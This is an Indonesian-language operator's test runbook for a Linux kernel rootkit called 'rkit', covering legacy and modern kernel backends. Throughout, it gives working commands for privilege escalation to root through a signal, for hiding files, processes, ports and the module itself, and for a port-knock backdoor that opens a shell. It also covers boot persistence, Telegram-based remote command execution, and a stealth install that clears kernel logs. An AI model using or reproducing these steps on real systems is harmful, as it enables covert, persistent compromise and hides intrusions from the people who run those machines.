# =============================================
#  UJI CEPAT ROOTKIT — PANDUAN LENGKAP (DUA JALUR)
# =============================================
#  Langkah 0 = kenali backend (pilih jalur A atau B):
#     lsmod | grep rkit
#       rkit4x            -> LEGACY  (2.6-4.19)  -> BAGIAN B
#       rkit / rkit6x     -> MODERN / NEWEST      -> BAGIAN A
#     rkit status jalan = modern;  error /proc/rkit = legacy
#
#  Contoh mesin teruji: portal & pess (5.15), AWS (6.1), el8 (4.18)
#  Mode: SEMUA sebagai root; siapkan `dmesg -w` di terminal lain
#  Status per baris kernel: docs/KERNEL_COMPAT.md (naikkan HANYA setelah lolos)
# =============================================


# =============================================
#  BAGIAN A — MODERN / NEWEST (CLI + /proc/rkit)
# =============================================
#  CLI: /rootkit/control/cli/rkit

1. STATUS AWAL
   /rootkit/control/cli/rkit status

2. LPE — dari user biasa
   runuser -u nobody -- sh -c 'kill -s 63 1 && id'
   -> diharapkan: uid=0(root) + dmesg "root diberikan ke pid ..."

3a. HIDE FILE (by nama persis)
   touch /tmp/tesrahasia.txt
   /rootkit/control/cli/rkit hide file tesrahasia.txt
   ls /tmp | grep tesrahasia                     # KOSONG (tersembunyi)
   ls -la /tmp/tesrahasia.txt                    # path langsung tetap jalan (batas v1)
   Batal: /rootkit/control/cli/rkit unhide file tesrahasia.txt

3b. HIDE FOLDER (mekanisme sama — targetnya NAMA, bukan jenis)
    mkdir /tmp/rahasia-folder
    /rootkit/control/cli/rkit hide file rahasia-folder
    ls /tmp | grep rahasia-folder                # KOSONG
    ls -d /tmp/rahasia-folder                    # path langsung tetap jalan
    Batal: /rootkit/control/cli/rkit unhide file rahasia-folder

4. HIDE PID
   # a) sembunyikan PID yang SUDAH berjalan (pemakaian nyata):
   /rootkit/control/cli/rkit hide pid 12345
   ps aux | grep -w 12345 | grep -v grep         # KOSONG
   Batal: /rootkit/control/cli/rkit unhide pid 12345
   # b) atau pakai korban uji sendiri:
   sleep 600 & SP=$!
   /rootkit/control/cli/rkit hide pid $SP
   ps aux | grep -w $SP | grep -v grep           # KOSONG
   kill $SP
   # catatan: hidepid TIDAK ikut reboot -> re-hide otomatis: tools/rkit-rehide.sh

5. HIDE PORT (koneksi)
   (python3 -m http.server 8080 &)
   /rootkit/control/cli/rkit hide port 8080
   cat /proc/net/tcp | grep -i1F90               # KOSONG (8080 = 0x1F90, portable)
   netstat -tlnp 2>/dev/null | grep 8080         # KOSONG (kalau netstat terpasang)
   ss -tln | grep 8080                           # mungkin MASIH terlihat = batas jujur
   Batal: /rootkit/control/cli/rkit unhide port 8080
   pkill -f http.server

6. SELF-HIDE MODUL — urutan WAJIB
   /rootkit/control/cli/rkit hide mod
   lsmod | grep rkit                             # KOSONG
   /rootkit/control/cli/rkit unhide mod          # WAJIB sebelum rmmod!
   lsmod | grep rkit                             # muncul lagi
   (lupa unhide -> rmmod gagal -> harus reboot)

7. UNLOAD BERSIH
   rmmod rkit                                    # newest: rmmod rkit6x
   dmesg | tail -3                               # "dilepas/dipulihkan", TANPA OOPS

8. BACKDOOR — mati default (state normal)
   timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337' || echo "OK: NONAKTIF"

9. BACKDOOR — AKTIF (opt-in, reload dengan param)
   rmmod rkit
   insmod /rootkit/backend/modern_5x_6x/kernel/rkit.ko backdoor_ip=127.0.0.1 backdoor_port=4444 knock_port=1337
   # terminal A :  nc -l 4444
   # terminal B :  timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337'
   -> shell masuk di A -> ketik id
   (throttle: knock ke-2 dalam 5 dtk diabaikan = hanya 1 shell)
   Batal: rmmod rkit && insmod <path>/rkit.ko   (reload polos)

10. STATE + REBOOT (persistensi boot)
    /rootkit/control/cli/rkit hide file bintang.txt
    cat /var/lib/rkit/state                      # ada baris: name bintang.txt
    reboot
    /rootkit/control/cli/rkit status             # daftar masih ada = boot-restore OK
    lsmod | grep rkit                            # modul hidup lagi tanpa intervensi

11. TELEGRAM (opsional — di mesin modern /hide bot AKTIF penuh)
    cd /rootkit && cp config.example.ini config.ini   # isi token + chat id + CONTROL_MODE=telegram
    sudo bash install.sh                              # daemon + cron @reboot

12. PASCA-UJI (bersih-bersih)
    /rootkit/control/cli/rkit unhide file bintang.txt
    rmmod rkit
    dmesg | grep -iE 'oops|BUG:' | tail -5       # harus KOSONG


# =============================================
#  BAGIAN B — LEGACY (2.6 – 4.19: sinyal + param insmod)
# =============================================
#  TIDAK ada /proc/rkit, TIDAK ada CLI
#  WAJIB: kill -s SPASI (bash menolak -s63 menempel)
#  Ubah daftar = RELOAD (rmmod + insmod, tulis ULANG semua nama)

1. IDENTIFIKASI + STATUS
   lsmod | grep rkit                            # rkit4x = legacy
   dmesg | grep l4x | tail -5                   # harap: "getdents+kill dipasang",
                                                # conn-hide 4/4, self-hide siap

2. LPE — dari user biasa
   runuser -u nobody -- sh -c 'kill -s 63 1 && id'
   -> uid=0(root) + dmesg "l4x: root diberikan ke pid ..."
   (terminal senyap = normal; bukti di dmesg)

3. HIDE FILE + FOLDER (nama persis, via reload)
   touch /tmp/uji.txt && mkdir /tmp/uji-folder
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hide=uji.txt,uji-folder
   ls /tmp | grep uji                            # KOSONG (keduanya)
   ls -la /tmp/uji.txt                           # path langsung tetap jalan (batas v1)
   Batal / ubah daftar: reload lagi + tulis ULANG semua nama

4. HIDE PID (hidepid= — boleh banyak dipisah koma)
   sleep 600 &
   SP=$!
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hidepid=$SP
   ps aux | grep -w $SP | grep -v grep           # KOSONG
   cat /proc/$SP/comm                            # masih terbaca (path langsung)
   kill $SP
   Batal: rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko  (reload polos)

5. HIDE PORT (hideport= + cek /proc/net/tcp)
   (python3 -m http.server 8080 &)
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hideport=8080
   cat /proc/net/tcp | grep -i1F90               # KOSONG (8080 = 0x1F90)
   ss -tln | grep 8080                           # mungkin MASIH terlihat = batas jujur
   pkill -f http.server
   Batal: reload polos (lihat langkah4)

6. SELF-HIDE MODUL (sinyal — urutan WAJIB)
   kill -s 64 1
   lsmod | grep rkit                             # KOSONG (dmesg: "modul disembunyikan")
   kill -s 62 1
   lsmod | grep rkit                             # muncul lagi (dmesg: "dikembalikan")
   (lupa 62 -> rmmod tak menemukan modul -> harus reboot)

7. UNLOAD BERSIH
   rmmod rkit4x
   dmesg | tail -3                               # "dilepas — tabel syscall dipulihkan"

8. BACKDOOR — mati default
   timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337' || echo "OK: NONAKTIF"

9. BACKDOOR — AKTIF (reload dengan param)
   rmmod rkit4x
   insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko backdoor_ip=127.0.0.1 backdoor_port=4444 knock_port=1337
   # terminal A :  nc -l 4444
   # terminal B :  timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337'
   -> shell masuk; throttle 5 dtk
   Batal: reload polos

10. STATE BOOT (persistensi — TULIS MANUAL, tanpa CLI)
    echo "name rahasia.txt" >> /var/lib/rkit/state
    echo "port8080" >> /var/lib/rkit/state
    reboot
    dmesg | grep daftar | tail -1                # "daftar hide = 1 nama, 1 port" = restore OK
    # PID TIDAK ditulis ke state — sengaja (PID berubah tiap boot)

11. TELEGRAM (opsional)
    cd /rootkit && cp config.example.ini config.ini
    sudo bash install.sh
    # /hide bot TIDAK jalan di legacy — pakai /exec:
    #   /exec rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hide=.rkit
    #   /exec kill -s 64 1

12. PASCA-UJI
    rmmod rkit4x
    dmesg | grep -icE 'oops|BUG:'               # harus 0


# =============================================
#  STEALTH SEKALI-JALAN (tanpa script terpisah)
# =============================================
#  sudo sh install.sh --stealth           <- flag biasa (disarankan)
#  sudo STEALTH=1 sh install.sh           <- alias lama
#    = install normal + hide mod + dmesg -C (langkah 10 di install.sh)
#    TANPA flag = install biasa (modul tampil di lsmod, dipakai saat uji)

# =============================================
#  SELESAI
# =============================================
#  Sinyal legacy:  kill -s 63 LPE (dua backend)
#                  kill -s 64 hide modul / -s 62 tampilkan (legacy)
#  Batas jujur v1:
#   - akses path langsung selalu tembus (file/PID tersembunyi)
#   - ss (netlink) bisa tetap melihat port yang disembunyikan
#   - jejak lain (sys module, journal, audit) lihat docs/DETECTION.md
#  Rekap status: docs/KERNEL_COMPAT.md (🚧 / 🧪 / ✅ per versi kernel)
# =============================================
